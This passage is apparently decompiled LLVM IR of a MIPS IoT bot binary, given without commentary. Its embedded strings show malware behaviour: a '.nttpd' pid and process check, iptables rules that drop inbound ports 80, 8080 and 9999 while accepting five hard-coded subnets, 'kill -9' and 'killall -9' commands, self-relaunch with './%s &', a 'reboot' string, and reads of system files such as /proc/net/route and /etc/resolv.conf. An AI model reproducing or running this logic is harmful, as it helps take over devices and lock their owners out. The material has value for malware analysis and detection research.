source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_IO_FILE = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%rlimit = type { i32, i32 }
%re_pattern_buffer = type { i8*, i32, i32, i32, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%_TYPEDEF_regmatch_t = type { i32, i32 }
%sockaddr = type { i32, [14 x i8] }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }

@v0 = internal unnamed_addr global i32 0
@a2 = internal unnamed_addr global i32 0
@gp = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ra = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_4230f0.1 = global i32 0
@global_var_420000.2 = global i32 0
@global_var_41b108.6 = local_unnamed_addr global i32 4204968
@global_var_41b10c.7 = local_unnamed_addr global i32 4199020
@global_var_41b110.8 = local_unnamed_addr global i32 4236944
@global_var_41b234.10 = local_unnamed_addr global i32 0
@global_var_41b270.11 = local_unnamed_addr global i32 0
@global_var_41b1e8.19 = local_unnamed_addr global i32 4236752
@global_var_41b268.20 = local_unnamed_addr global i32 4236256
@global_var_41b220.22 = local_unnamed_addr global i32 4236528
@global_var_40a6f4.23 = constant [25 x i8] c"memory allication failed\00"
@global_var_41b2bc.24 = local_unnamed_addr global i32 4235952
@global_var_41b1f0.25 = local_unnamed_addr global i32 4236720
@global_var_41b254.26 = local_unnamed_addr global i32 4236336
@global_var_41b2f4.27 = local_unnamed_addr global i32 4235728
@global_var_41b2b4.28 = local_unnamed_addr global i32 4235984
@global_var_41b1e0.29 = local_unnamed_addr global i32 4236784
@global_var_41b224.31 = local_unnamed_addr global i32 4236512
@global_var_40a714.32 = constant [6 x i8] c"%d,%d\00"
@global_var_41b2c8.33 = local_unnamed_addr global i32 4235904
@global_var_41b21c.34 = local_unnamed_addr global i32 4236544
@global_var_41b288.36 = local_unnamed_addr global i32 4236160
@global_var_41b250.37 = local_unnamed_addr global i32 4236352
@global_var_41b200.38 = local_unnamed_addr global i32 4236656
@global_var_41b298.39 = local_unnamed_addr global i32 4236096
@global_var_41b248.40 = local_unnamed_addr global i32 4236384
@global_var_40a72c.41 = constant [11 x i8] c".nttpd.pid\00"
@global_var_41b120.42 = local_unnamed_addr global i32 4201928
@global_var_41b124.43 = local_unnamed_addr global i32 4232644
@global_var_41b128.44 = local_unnamed_addr global i32 4232840
@global_var_40a738.45 = constant [29 x i8] c"ps | grep .nttpd > .nttpd.ps\00"
@global_var_41b12c.46 = local_unnamed_addr global i32 4216160
@global_var_40a758.47 = constant [10 x i8] c".nttpd.ps\00"
@global_var_40a768.49 = constant [3 x i8] c"%d\00"
@global_var_41b23c.50 = local_unnamed_addr global i32 4236432
@global_var_40a720.51 = constant [4 x i8] c"clk\00"
@global_var_41b030.52 = global [4 x i8]* @global_var_40a720.51
@global_var_41b054.53 = global i32 7200
@global_var_41b13c.57 = local_unnamed_addr global i32 4215232
@global_var_41b144.59 = local_unnamed_addr global i32 4305716
@global_var_41b148.61 = local_unnamed_addr global i32 4305712
@global_var_41b14c.62 = local_unnamed_addr global i32 4215692
@global_var_41b150.63 = local_unnamed_addr global i32 4216076
@global_var_41b154.64 = local_unnamed_addr global i32 4408180
@global_var_41b164.69 = local_unnamed_addr global i32 4222776
@global_var_41b168.70 = local_unnamed_addr global i32 4227048
@global_var_41b16c.71 = local_unnamed_addr global i32 4227636
@global_var_41b170.72 = local_unnamed_addr global i32 4230188
@global_var_41b174.73 = local_unnamed_addr global i32 4228696
@global_var_41b178.74 = local_unnamed_addr global i32 4231308
@global_var_41b214.76 = local_unnamed_addr global i32 4236576
@global_var_41b180.77 = local_unnamed_addr global i32 4218712
@global_var_41b338.78 = local_unnamed_addr global i32 0
@global_var_41b33c.79 = local_unnamed_addr global i32 0
@global_var_41b2c0.81 = local_unnamed_addr global i32 4235936
@global_var_41b0c0.82 = global i32 4209728
@global_var_41b0a0.83 = global i32 1540857462
@global_var_430000.84 = global i32 0
@global_var_434380.85 = global i32 0
@global_var_40a770.86 = constant [5 x i8] c" -I \00"
@global_var_41b18c.88 = local_unnamed_addr global i32 4233332
@global_var_41b340.89 = local_unnamed_addr global i32 0
@global_var_40a79c.90 = constant [5 x i8] c" -D \00"
@global_var_41b36c.91 = local_unnamed_addr global i32 0
@global_var_40455c.92 = constant i32 -1881407456
@global_var_41b2cc.95 = local_unnamed_addr global i32 4235888
@global_var_40a7b8.96 = constant [6 x i8] c"%s,%d\00"
@global_var_41b20c.97 = local_unnamed_addr global i32 4236608
@global_var_41b194.99 = local_unnamed_addr global i32 4202464
@global_var_40a7c0.100 = constant [7 x i8] c"./%s &\00"
@global_var_41b19c.101 = local_unnamed_addr global i32* @global_var_434380.85
@global_var_41b354.102 = local_unnamed_addr global i32 0
@global_var_41b358.104 = global i32 0
@global_var_41b35c.105 = local_unnamed_addr global i32 0
@global_var_41b360.106 = local_unnamed_addr global i32 0
@global_var_41b1a4.107 = local_unnamed_addr global i32 4220788
@global_var_41b1a8.108 = local_unnamed_addr global i32 4220368
@global_var_41b350.109 = local_unnamed_addr global i32 0
@global_var_41b2ac.111 = local_unnamed_addr global i32 4236016
@global_var_41b1bc.112 = local_unnamed_addr global i32 4236896
@global_var_434370.113 = local_unnamed_addr global i32 0
@global_var_41b1c0.114 = local_unnamed_addr global i32 4236880
@global_var_40a7d0.115 = constant [34 x i8] c"INPUT -p udp --dport 9999 -j DROP\00"
@global_var_40a7f4.116 = constant [34 x i8] c"INPUT -p tcp --dport 8080 -j DROP\00"
@global_var_40a818.117 = constant [32 x i8] c"INPUT -p tcp --dport 80 -j DROP\00"
@global_var_40a838.118 = constant [35 x i8] c"INPUT -s 91.215.158.0/24 -j ACCEPT\00"
@global_var_40a85c.119 = constant [36 x i8] c"INPUT -s 149.202.211.0/24 -j ACCEPT\00"
@global_var_40a880.120 = constant [35 x i8] c"INPUT -s 217.79.182.0/24 -j ACCEPT\00"
@global_var_40a8a4.121 = constant [35 x i8] c"INPUT -s 208.110.66.0/24 -j ACCEPT\00"
@global_var_40a8c8.122 = constant [36 x i8] c"INPUT -s 173.208.219.0/24 -j ACCEPT\00"
@global_var_41b0d0.123 = global [8 x i8*] [i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_40a7d0.115, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_40a7f4.116, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_40a818.117, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_40a838.118, i32 0, i32 0), i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_40a85c.119, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_40a880.120, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_40a8a4.121, i32 0, i32 0), i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_40a8c8.122, i32 0, i32 0)]
@global_var_40a8ec.124 = constant [5 x i8] c" -I \00"
@global_var_40a8f4.125 = constant [5 x i8] c" -D \00"
@global_var_40a8fc.127 = constant [7 x i8] c"reboot\00"
@global_var_41b2b0.128 = local_unnamed_addr global i32 4236000
@global_var_40a904.129 = constant i32 4216552
@global_var_41b238.130 = local_unnamed_addr global i32 4236448
@global_var_40a94c.131 = constant i32 4216884
@global_var_41b260.132 = local_unnamed_addr global i32 4236288
@global_var_40a994.133 = constant [14 x i8] c"/proc/meminfo\00"
@global_var_40a9a8.135 = constant [16 x i8] c"MemTotal: %d kB\00"
@global_var_40a9b8.136 = constant [15 x i8] c"MemFree: %d kB\00"
@global_var_41b2f0.137 = local_unnamed_addr global i32 4235744
@global_var_41b28c.138 = local_unnamed_addr global i32 4236144
@global_var_40a9c8.139 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_40a9e0.141 = constant [4 x i8] c"%s\0A\00"
@global_var_41b2d8.142 = local_unnamed_addr global i32 4235840
@global_var_40a9e4.143 = constant [25 x i8] c"memory allication failed\00"
@global_var_41b258.144 = local_unnamed_addr global i32 4236320
@global_var_41b1d0.145 = local_unnamed_addr global i32 4236832
@global_var_41b2dc.146 = local_unnamed_addr global i32 4235824
@global_var_41b1b0.147 = local_unnamed_addr global i32 4215124
@global_var_41b1c8.148 = local_unnamed_addr global i32 4236864
@global_var_41b2d4.149 = local_unnamed_addr global i32 4235856
@global_var_41b2d0.150 = local_unnamed_addr global i32 4235872
@global_var_41b2a8.151 = local_unnamed_addr global i32 4236032
@global_var_41b1ec.152 = local_unnamed_addr global i32 4236736
@global_var_41b1f8.153 = local_unnamed_addr global i32 4236688
@global_var_41b210.154 = local_unnamed_addr global i32 4236592
@global_var_41b1fc.155 = local_unnamed_addr global i32 4236672
@global_var_41b264.156 = local_unnamed_addr global i32 4236272
@global_var_40aa00.157 = constant [13 x i8] c"/dev/urandom\00"
@global_var_41b1e4.158 = local_unnamed_addr global i32 4236768
@global_var_41b25c.159 = local_unnamed_addr global i32 4236304
@global_var_41b228.160 = local_unnamed_addr global i32 4236496
@global_var_41b218.161 = local_unnamed_addr global i32 4236560
@global_var_41b2a0.162 = local_unnamed_addr global i32 4236064
@global_var_41b1f4.163 = local_unnamed_addr global i32 4236704
@global_var_40767c.164 = constant i32 -1881407472
@global_var_41b280.165 = local_unnamed_addr global i32 4236192
@global_var_41b244.166 = local_unnamed_addr global i32 4236400
@global_var_41b290.167 = local_unnamed_addr global i32 4236128
@global_var_41b274.168 = local_unnamed_addr global i32 4236224
@global_var_41b1cc.169 = local_unnamed_addr global i32 4236848
@global_var_41b208.170 = local_unnamed_addr global i32 4236624
@global_var_408a70.171 = constant i32 -1881407464
@global_var_40900c.172 = constant i32 -1881407464
@global_var_41b1b8.173 = local_unnamed_addr global i32 4236912
@global_var_40aa10.174 = constant [7 x i8] c"__fork\00"
@global_var_41b22c.175 = local_unnamed_addr global i32 4236480
@global_var_41b240.176 = local_unnamed_addr global i32 4236416
@global_var_41b26c.177 = local_unnamed_addr global i32 4236240
@global_var_41b1d8.178 = local_unnamed_addr global i32 4236816
@global_var_40aa18.179 = constant [10 x i8] c"/dev/null\00"
@global_var_41b2b8.180 = local_unnamed_addr global i32 4235968
@global_var_40aa24.181 = constant [9 x i8] c"/proc/%d\00"
@global_var_41b204.182 = local_unnamed_addr global i32 4236640
@global_var_40aa30.183 = constant [8 x i8] c"kill %d\00"
@global_var_40aa38.184 = constant [11 x i8] c"kill -9 %d\00"
@global_var_40aa44.185 = constant [14 x i8] c"killall -9 %s\00"
@global_var_41b284.189 = local_unnamed_addr global i32 4236176
@global_var_41b2e8.190 = local_unnamed_addr global i32 4235776
@global_var_41b2ec.191 = local_unnamed_addr global i32 4235760
@global_var_41b27c.192 = local_unnamed_addr global i32 4236208
@global_var_40aa60.193 = constant [16 x i8] c"/proc/net/route\00"
@global_var_41b2c4.194 = local_unnamed_addr global i32 4235920
@global_var_40aa70.195 = constant [5 x i8] c"%x%x\00"
@global_var_41b294.196 = local_unnamed_addr global i32 4236112
@global_var_41b000.197 = global i32 -1
@global_var_40a6f0.18 = external constant i8*
@global_var_434378.126 = external local_unnamed_addr global i8*
@global_var_41b11c.21 = external local_unnamed_addr global i8*
@1 = internal constant [2 x i8] c"r\00"
@2 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@3 = internal constant [2 x i8] c"w\00"
@4 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@5 = internal constant [2 x i8] c"r\00"
@6 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @5, i32 0, i32 0)
@global_var_41b320.54 = local_unnamed_addr global i8 0
@7 = internal constant [2 x i8] c"r\00"
@8 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @7, i32 0, i32 0)
@9 = internal constant [2 x i8] c"w\00"
@10 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @9, i32 0, i32 0)
@global_var_40a710.30 = constant [2 x i8] c"r\00"
@global_var_40a71c.35 = constant [2 x i8] c"w\00"
@global_var_40a764.48 = constant [2 x i8] c"r\00"
@global_var_40a9a4.134 = constant [2 x i8] c"r\00"
@global_var_40a9dc.140 = constant [2 x i8] c"w\00"

declare void @__pseudo_call(i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v4_4012e0 = load i32, i32* @v0, align 4
  ret i32 %v4_4012e0
}

define i32 @_ftext(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32* @gp, align 4
  %v3_401308 = load i32, i32* @global_var_41b108.6, align 4
  %v2_401310 = ptrtoint i32* %stack_var_4 to i32
  %v2_40131c = ptrtoint i32* %stack_var_-32 to i32
  %v3_401320 = load i32, i32* @global_var_41b10c.7, align 4
  %v3_401324 = load i32, i32* @global_var_41b110.8, align 4
  %v0_401330 = load i32, i32* @v0, align 4
  %v8_401340 = call i32 @__uClibc_main(i32 %v3_401308, i32 %arg1, i32 %v2_401310, i32 %v3_401320, i32 %v3_401324, i32 %v0_401330, i32 %v2_40131c)
  ret i32 %v8_401340
}

define i32 @function_401350() local_unnamed_addr {
dec_label_pc_401350:
  br i1 icmp ult (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20233), i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236)), i32 7), label %dec_label_pc_40138c, label %dec_label_pc_40136c

dec_label_pc_40136c:                              ; preds = %dec_label_pc_401350
  %v3_401374 = load i32, i32* @global_var_41b234.10, align 4
  %v1_40137c = icmp eq i32 %v3_401374, 0
  br i1 %v1_40137c, label %dec_label_pc_40138c, label %dec_label_pc_401380

dec_label_pc_401380:                              ; preds = %dec_label_pc_40136c
  %v2_401384 = call i32 @unknown_0(i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236))
  br label %dec_label_pc_40138c

dec_label_pc_40138c:                              ; preds = %dec_label_pc_40136c, %dec_label_pc_401350, %dec_label_pc_401380
  %v1_40138c = phi i32 [ zext (i1 icmp ult (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20233), i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236)), i32 7) to i32), %dec_label_pc_40136c ], [ zext (i1 icmp ult (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20233), i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236)), i32 7) to i32), %dec_label_pc_401350 ], [ %v2_401384, %dec_label_pc_401380 ]
  ret i32 %v1_40138c

; uselistorder directives
  uselistorder i1 icmp ult (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20233), i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236)), i32 7), { 1, 0 }
  uselistorder label %dec_label_pc_40138c, { 2, 0, 1 }
}

define i32 @function_401390(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_401390:
  br i1 icmp eq (i32 ashr (i32 add (i32 ashr (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236), i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236)), i32 2), i32 lshr (i32 ashr (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236), i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236)), i32 2), i32 31)), i32 1), i32 0), label %dec_label_pc_4013dc, label %dec_label_pc_4013bc

dec_label_pc_4013bc:                              ; preds = %dec_label_pc_401390
  %v3_4013c4 = load i32, i32* @global_var_41b270.11, align 4
  %v1_4013cc = icmp eq i32 %v3_4013c4, 0
  br i1 %v1_4013cc, label %dec_label_pc_4013dc, label %dec_label_pc_4013d0

dec_label_pc_4013d0:                              ; preds = %dec_label_pc_4013bc
  %v2_4013d4 = call i32 @unknown_0(i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236))
  br label %dec_label_pc_4013dc

dec_label_pc_4013dc:                              ; preds = %dec_label_pc_4013bc, %dec_label_pc_401390, %dec_label_pc_4013d0
  %v1_4013dc = phi i32 [ lshr (i32 ashr (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236), i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236)), i32 2), i32 31), %dec_label_pc_4013bc ], [ lshr (i32 ashr (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236), i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236)), i32 2), i32 31), %dec_label_pc_401390 ], [ %v2_4013d4, %dec_label_pc_4013d0 ]
  ret i32 %v1_4013dc

; uselistorder directives
  uselistorder i32 (i32)* @unknown_0, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_420000.2 to i32), i32 -20236), { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_4013dc, { 2, 0, 1 }
}

define i32 @function_401550(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_401550:
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  store i32 %tmp, i32* %v0.global-to-local, align 4
  %v1_401580 = icmp eq i8* %arg1, null
  br i1 %v1_401580, label %dec_label_pc_4018b0, label %dec_label_pc_401594

dec_label_pc_401594:                              ; preds = %dec_label_pc_401550
  %v5_401574 = inttoptr i32 %arg3 to i8*
  %v5_401570 = inttoptr i32 %arg2 to i8*
  %v1_40159c = icmp eq i32 %arg2, 0
  %stack_var_4.0 = select i1 %v1_40159c, i8* bitcast (i8** @global_var_40a6f0.18 to i8*), i8* %v5_401570
  %v3_4015b4 = load i32, i32* @global_var_41b1e8.19, align 4
  store i32 %v3_4015b4, i32* %v0.global-to-local, align 4
  %v4_4015c0 = call i32 @strlen(i8* %stack_var_4.0)
  %v1_4015d8 = icmp eq i32 %arg3, 0
  %stack_var_8.0 = select i1 %v1_4015d8, i8* bitcast (i8** @global_var_40a6f0.18 to i8*), i8* %v5_401574
  %v3_4015f0 = load i32, i32* @global_var_41b1e8.19, align 4
  store i32 %v3_4015f0, i32* %v0.global-to-local, align 4
  %v4_4015fc = call i32 @strlen(i8* %stack_var_8.0)
  %v3_40160c = load i8*, i8** %stack_var_0, align 4
  %v3_40165011 = load i32, i32* @global_var_41b268.20, align 4
  store i32 %v3_40165011, i32* %v0.global-to-local, align 4
  %v7_40165c12 = call i8* @strstr(i8* %v3_40160c, i8* %stack_var_4.0)
  %v9_40165c13 = ptrtoint i8* %v7_40165c12 to i32
  store i32 %v9_40165c13, i32* %v0.global-to-local, align 4
  %v1_40167414 = icmp eq i8* %v7_40165c12, null
  br i1 %v1_40167414, label %dec_label_pc_401678, label %dec_label_pc_401624

dec_label_pc_401624:                              ; preds = %dec_label_pc_401594, %dec_label_pc_401624
  %v9_40165c16 = phi i32 [ %v9_40165c, %dec_label_pc_401624 ], [ %v9_40165c13, %dec_label_pc_401594 ]
  %storemerge2.off015 = phi i32 [ %v1_401640, %dec_label_pc_401624 ], [ 0, %dec_label_pc_401594 ]
  %v2_401630 = add i32 %v9_40165c16, %v4_4015c0
  %v5_401634 = inttoptr i32 %v2_401630 to i8*
  %v1_401640 = add i32 %storemerge2.off015, 1
  %v3_401650 = load i32, i32* @global_var_41b268.20, align 4
  store i32 %v3_401650, i32* %v0.global-to-local, align 4
  %v7_40165c = call i8* @strstr(i8* %v5_401634, i8* %stack_var_4.0)
  %v9_40165c = ptrtoint i8* %v7_40165c to i32
  store i32 %v9_40165c, i32* %v0.global-to-local, align 4
  %v1_401674 = icmp eq i8* %v7_40165c, null
  br i1 %v1_401674, label %dec_label_pc_401678, label %dec_label_pc_401624

dec_label_pc_401678:                              ; preds = %dec_label_pc_401624, %dec_label_pc_401594
  %storemerge2.off0.lcssa = phi i32 [ 0, %dec_label_pc_401594 ], [ %v1_401640, %dec_label_pc_401624 ]
  %v3_40167c = load i8*, i8** %stack_var_0, align 4
  %v3_401680 = load i32, i32* @global_var_41b1e8.19, align 4
  store i32 %v3_401680, i32* %v0.global-to-local, align 4
  %v4_40168c = call i32 @strlen(i8* %v3_40167c)
  %v3_4016c8 = load i8*, i8** @global_var_41b11c.21, align 4
  %v4_4016c8 = ptrtoint i8* %v3_4016c8 to i32
  store i32 %v4_4016c8, i32* %v0.global-to-local, align 4
  %v1_4016ec = icmp eq i8* %v3_4016c8, null
  br i1 %v1_4016ec, label %dec_label_pc_401774, label %dec_label_pc_4016f0

dec_label_pc_4016f0:                              ; preds = %dec_label_pc_401678
  %v2_4016a8 = sub i32 %v4_4015fc, %v4_4015c0
  %v4_4016b4 = mul i32 %storemerge2.off0.lcssa, %v2_4016a8
  %v2_4016bc = add i32 %v4_4016b4, 1
  %v3_4016f4 = load i8*, i8** %stack_var_0, align 4
  %v3_4016f8 = load i32, i32* @global_var_41b1e8.19, align 4
  store i32 %v3_4016f8, i32* %v0.global-to-local, align 4
  %v4_401704 = call i32 @strlen(i8* %v3_4016f4)
  %v1_401738 = add i32 %v4_401704, %v2_4016bc
  %v3_401748 = load i32, i32* @global_var_41b220.22, align 4
  store i32 %v3_401748, i32* %v0.global-to-local, align 4
  %tmp33 = bitcast i8* %v3_4016c8 to i32*
  %v6_401754 = call i32* @memset(i32* %tmp33, i32 0, i32 %v1_401738)
  store i32 %storemerge2.off0.lcssa, i32* %v0.global-to-local, align 4
  %v1_40188435 = icmp eq i32 %storemerge2.off0.lcssa, 0
  %v3_401890.pre = load i8*, i8** %stack_var_0, align 4
  br i1 %v1_40188435, label %dec_label_pc_401888, label %dec_label_pc_4017ac

dec_label_pc_401774:                              ; preds = %dec_label_pc_401678
  %v3_40177c = load i32, i32* @global_var_41b2bc.24, align 4
  store i32 %v3_40177c, i32* %v0.global-to-local, align 4
  call void @perror(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_40a6f4.23, i32 0, i32 0))
  %v3_401798 = load i32, i32* @global_var_41b1f0.25, align 4
  store i32 %v3_401798, i32* %v0.global-to-local, align 4
  call void @exit(i32 -1)
  unreachable

dec_label_pc_4017ac:                              ; preds = %dec_label_pc_4016f0, %dec_label_pc_4017ac
  %v1_40187c37.in = phi i32 [ %v1_40187c37, %dec_label_pc_4017ac ], [ %storemerge2.off0.lcssa, %dec_label_pc_4016f0 ]
  %stack_var_-36.136 = phi i8* [ %v5_401850, %dec_label_pc_4017ac ], [ %v3_4016c8, %dec_label_pc_4016f0 ]
  %v1_40187c37 = add i32 %v1_40187c37.in, -1
  %v3_4017b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32392) to i32*), align 4
  store i32 %v3_4017b4, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4017b4)
  %v0_4017cc = load i32, i32* %v0.global-to-local, align 4
  %v3_4017d4 = load i8*, i8** %stack_var_0, align 4
  %v4_4017d4 = ptrtoint i8* %v3_4017d4 to i32
  %v2_4017dc = sub i32 %v0_4017cc, %v4_4017d4
  %v3_4017f4 = load i32, i32* @global_var_41b254.26, align 4
  store i32 %v3_4017f4, i32* %v0.global-to-local, align 4
  %v8_401800 = call i8* @strncpy(i8* %stack_var_-36.136, i8* %v3_4017d4, i32 %v2_4017dc)
  %v10_401800 = ptrtoint i8* %v8_401800 to i32
  %v2_401818 = add i32 %v10_401800, %v2_4017dc
  %v5_40181c = inttoptr i32 %v2_401818 to i8*
  %v3_401828 = load i32, i32* @global_var_41b2f4.27, align 4
  store i32 %v3_401828, i32* %v0.global-to-local, align 4
  %v7_401834 = call i8* @strcpy(i8* %v5_40181c, i8* %stack_var_8.0)
  %v9_401834 = ptrtoint i8* %v7_401834 to i32
  %v2_40184c = add i32 %v9_401834, %v4_4015fc
  %v5_401850 = inttoptr i32 %v2_40184c to i8*
  %v2_401860 = add i32 %v2_4017dc, %v4_4015c0
  %v3_401864 = load i8*, i8** %stack_var_0, align 4
  %v4_401864 = ptrtoint i8* %v3_401864 to i32
  %v2_40186c = add i32 %v2_401860, %v4_401864
  %v5_401870 = inttoptr i32 %v2_40186c to i8*
  store i8* %v5_401870, i8** %stack_var_0, align 4
  store i32 %v1_40187c37, i32* %v0.global-to-local, align 4
  %v1_401884 = icmp eq i32 %v1_40187c37, 0
  br i1 %v1_401884, label %dec_label_pc_401888, label %dec_label_pc_4017ac

dec_label_pc_401888:                              ; preds = %dec_label_pc_4016f0, %dec_label_pc_4017ac
  %v3_401890 = phi i8* [ %v5_401870, %dec_label_pc_4017ac ], [ %v3_401890.pre, %dec_label_pc_4016f0 ]
  %stack_var_-36.1.lcssa = phi i8* [ %v5_401850, %dec_label_pc_4017ac ], [ %v3_4016c8, %dec_label_pc_4016f0 ]
  %v3_401894 = load i32, i32* @global_var_41b2f4.27, align 4
  store i32 %v3_401894, i32* %v0.global-to-local, align 4
  %v7_4018a0 = call i8* @strcpy(i8* %stack_var_-36.1.lcssa, i8* %v3_401890)
  %v9_4018a0 = ptrtoint i8* %v7_4018a0 to i32
  store i32 %v9_4018a0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4018b0

dec_label_pc_4018b0:                              ; preds = %dec_label_pc_401550, %dec_label_pc_401888
  %storemerge = phi i32 [ %v4_4016c8, %dec_label_pc_401888 ], [ 0, %dec_label_pc_401550 ]
  store i32 %storemerge, i32* %v0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v5_401850, { 1, 0 }
  uselistorder i32 %v1_40187c37, { 1, 0, 2 }
  uselistorder i8* %v3_4016c8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v9_40165c, { 1, 0 }
  uselistorder i8* %stack_var_8.0, { 1, 0 }
  uselistorder i32 %v4_4015c0, { 0, 2, 1 }
  uselistorder i8* %stack_var_4.0, { 2, 0, 1 }
  uselistorder i8** %stack_var_0, { 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* %v0.global-to-local, { 15, 5, 3, 4, 6, 7, 18, 19, 20, 21, 2, 8, 9, 10, 11, 12, 13, 1, 0, 17, 14, 16 }
  uselistorder i8* (i8*, i8*)* @strstr, { 1, 0 }
  uselistorder i32* @global_var_41b268.20, { 1, 0 }
  uselistorder label %dec_label_pc_4018b0, { 1, 0 }
  uselistorder label %dec_label_pc_401888, { 1, 0 }
  uselistorder label %dec_label_pc_4017ac, { 1, 0 }
  uselistorder label %dec_label_pc_401624, { 1, 0 }
}

define i32 @function_4018c8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4018c8:
  %tmp = trunc i32 %arg2 to i8
  %tmp14 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v4_401924 = call i32 @strlen(i8* %arg1)
  %v2_4019c44 = icmp ne i32 %arg4, 0
  %v1_4019c86 = icmp eq i1 %v2_4019c44, false
  br i1 %v1_4019c86, label %dec_label_pc_4019f4, label %dec_label_pc_4019cc.lr.ph

dec_label_pc_4019cc.lr.ph:                        ; preds = %dec_label_pc_4018c8
  %v2_4019dc28 = add i32 %tmp14, %v4_401924
  %v2_4019e830 = icmp ult i32 %v2_4019dc28, %tmp14
  %v1_4019ec32 = icmp eq i1 %v2_4019e830, false
  br i1 %v1_4019ec32, label %dec_label_pc_40193c, label %dec_label_pc_4019f4

dec_label_pc_40193c:                              ; preds = %dec_label_pc_4019cc.lr.ph, %dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge
  %v4_4019e036 = phi i32 [ %v4_4019e0, %dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge ], [ %tmp14, %dec_label_pc_4019cc.lr.ph ]
  %stack_var_-24.1735 = phi i32 [ %stack_var_-24.0, %dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge ], [ 0, %dec_label_pc_4019cc.lr.ph ]
  %stack_var_-20.0834 = phi i8* [ %v5_4019b4.pre-phi, %dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge ], [ %arg1, %dec_label_pc_4019cc.lr.ph ]
  %stack_var_-16.1933 = phi i8* [ %stack_var_-16.0, %dec_label_pc_4019a8.dec_label_pc_4019cc_crit_edge ], [ %arg1, %dec_label_pc_4019cc.lr.ph ]
  %v2_401944 = load i8, i8* %stack_var_-20.0834, align 1
  %v2_401950 = icmp eq i8 %tmp, %v2_401944
  br i1 %v2_401950, label %dec_label_pc_401954, label %dec_label_pc_40193c.dec_label_pc_4019a8_crit_edge

dec_label_pc_40193c.dec_label_pc_4019a8_crit_edge: ; preds = %dec_label_pc_40193c
  %.pre = add i32 %v4_4019e036, 1
  %.pre13 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_4019a8

dec_label_pc_401954:                              ; preds = %dec_label_pc_40193c
  %v1_401960 = mul i32 %stack_var_-24.1735, 4
  %v2_40196c = add i32 %v1_401960, %arg3
  %v4_401970 = ptrtoint i8* %stack_var_-16.1933 to i32
  %v2_401978 = inttoptr i32 %v2_40196c to i32*
  store i32 %v4_401970, i32* %v2_401978, align 4
